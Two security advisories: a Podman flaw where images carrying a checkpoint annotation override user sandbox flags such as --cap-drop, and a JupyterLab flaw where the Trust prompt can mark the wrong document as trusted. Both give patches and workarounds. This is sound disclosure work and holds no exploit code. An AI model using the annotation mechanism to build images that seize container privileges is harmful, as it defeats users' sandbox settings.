items.summary: ### Impact Podman v4.4.0 added a feature where container checkpoints (from the `podman container checkpoint` command) could be distributed via OCI registry, and pulled from that registry and run via the `podman run` command. This allowed easy transfer of checkpoints between systems. However, checkpoints allow complete control of how the container is created - including full control of the container sandbox. When `podman run` detects a checkpoint, it will silently ignore all user input regarding how the container should be created - for example, `podman run --cap-drop=ALL` on an image that is determined to be a checkpoint will ignore `--cap-drop=all` and use the set of capabilities specified by the checkpoint image instead, which could include all capabilities. Podman identifies checkpoint images by looking for an annotation, `io.podman.annotations.checkpoint.runtime.name`. If this annotation is set, the image is treated as a checkpoint. Conflating container images and checkpoints in `podman run` allows inherently insecure behavior as the image can now control how it is executed. The Podman Maintainers have determined that the safest course of action is to remove this functionality. ### Patch The commit introducing this functionality was reverted. 3721ff82ffb44a4ceeaecc5abd3808e924a6b669 c74b1d37b3fb834b0de43e176565d9d8c254b627 fa6cef22c2baf3987b581c673bb416ef0585daf7 (main) ea9243e04d1db3886dc3a51ee3300ffb547cfc02 450c64426dbcff1097d3c7911d791101e3d16f4c 2d05a7c61f022d4f24980ea6d307fa53da2b8692 (v6.1) 7728ba0a90094408ad9078e36c3622a651d49616 24706290d5c974f078d8ca284026802515f28e92 29c8c6e50607df7a7d735ace09ff0ea099c0b3e0 (v5.8) ### Workarounds Images being pulled should be scanned for the `io.podman.annotations.checkpoint.runtime.name` annotation, and rejected if it is present. Podman does not presently have the ability to perform this scanning and rejection automatically. Also not that rootless containers are not affected as they do not support checkpoint/restore at all currently. ### Credits This vulnerability was discovered by ADA Logics Ltd using Anthropic's Claude models.

items.title: JupyterLab: Command link trust prompt in JupyterLab can trust a document other than the one clicked
items.summary: ## Description A Markdown file or a notebook output can carry a button that runs a JupyterLab command. Since 4.5.7 the first click on such a button opens a prompt naming the command, with Cancel, Run Once and Trust. Choosing Trust runs the command and marks the document trusted, so its later buttons run without a prompt. Which document gets marked is decided when the user answers, not when they click. Both trust commands read whichever document is current at that moment: `markdownviewer:trust` uses `tracker.currentWidget`, and `notebook:trust` uses the equivalent lookup. If another document becomes current while the prompt is open, that document is the one marked trusted, and the one the user was looking at stays untrusted. Users are affected if all of the following are true: - they run JupyterLab 4.5.7 through 4.6.3, or an application that bundles it such as Notebook 7.5+; - they open a Markdown file or notebook from someone else and click a button in it; - they answer Trust rather than Cancel or Run Once; and - a second document becomes the current one while the prompt is open, for example through a workspace restoring at startup, an extension activating a widget, or a command that opens a file ### Impact The user loses control over which document they trusted. Every button in the document that was (incorrectly) marked as trusted runs from then on without a prompt, so if that document also came from an untrusted source, its buttons fire on a single click with no confirmation. That is the state the prompt was added to prevent, in [GHSA-mqcg-5x36-vfcg](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-mqcg-5x36-vfcg). The command that ran had the user's consent, because the prompt named it and they pressed Trust. The document they were reading stays untrusted, so it prompts again on the next click. #### Notebooks are written to disk When the document marked is a notebook, the effect outlives the browser session. `notebook:trust` marks every cell trusted and then saves the file, which results in the server signing it, so the notebook stays trusted when it is next opened. The save also writes out any unsaved edits in that notebook. A second confirmation appears first, but it says only that a trusted notebook may execute hidden code, without naming the file, so it does not show the user which notebook is about to be trusted. A Markdown preview marked this way stays trusted only until it is closed. Nothing is written to disk. ### Patches JupyterLab [`v4.6.4`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4) and [`v4.5.11`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11) contain the patch. The trust request now carries the document that was clicked, and the command is run only once that same document has been marked. Users of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too. ### Workarounds Given the high complexity of a potential exploit, we advise treating this as a defense in-depth and update at earliest opportunity, rather than apply the workarounds listed below. However, for users running in highly sensitive environments who are unable to upgrade the workarounds are included below. Turn off command linker, which removes the ability to execute frontend commands altogether: ```json { "@jupyterlab/apputils-extension:sanitizer": { "allowCommandLinker": false } } ``` In such configuration the buttons in Markdown files and notebook outputs then do nothing when clicked. Documentation and extensions that use command links for navigation stop working, and the setting applies to every document, not only untrusted ones. If disabling that setting is not desirable and update is not possible, advise users to choose "Run Once" rather than "Trust". "Run Once" makes the command run but no document is marked, so nothing can be trusted in error.
